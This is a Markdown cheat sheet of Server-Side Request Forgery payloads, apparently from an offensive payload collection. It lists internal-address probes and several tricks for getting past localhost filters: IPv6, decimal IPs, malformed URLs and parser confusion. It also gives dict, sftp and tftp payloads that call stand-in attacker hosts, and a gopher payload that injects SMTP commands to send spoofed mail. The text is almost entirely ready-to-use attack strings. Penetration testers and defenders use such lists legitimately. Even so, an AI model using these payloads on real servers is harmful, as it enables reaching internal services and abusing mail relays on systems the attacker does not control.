# Server-Side Request Forgery
Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.

## Exploit

Basic SSRF v1
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
```

Basic SSRF v2
```
http://localhost:80
http://localhost:443
http://localhost:22
```

Advanced exploit using a redirection
```
1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
```

Advanced exploit using type=url
```
Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF
```

## Bypassing
Bypass localhost with [::]
```
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
```

Bypass localhost with a domain redirecting to locahost
```
http://n-pn.info
```

Bypass using a decimal ip location
```
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
```

Bypass using malformed urls
```
localhost:+11211aaa
localhost:00011211aaaa
```

Bypass using rare address
```
http://0/
```

Bypass using tricks combination
```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

## SSRF via URL Scheme
Dict://   
The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

Sftp://
```
ssrf.php?url=sftp://evil.com:11111/
```

Tftp://
```
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

Ldap://
```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

Gopher://
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a

will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH

You didn't say the magic word !


.
QUIT
```

## Thanks to
* [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
* [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
* [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
* [SSRF Tips - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
* [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
* [Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat](https://www.dailysecurity.fr/server-side-request-forgery/)
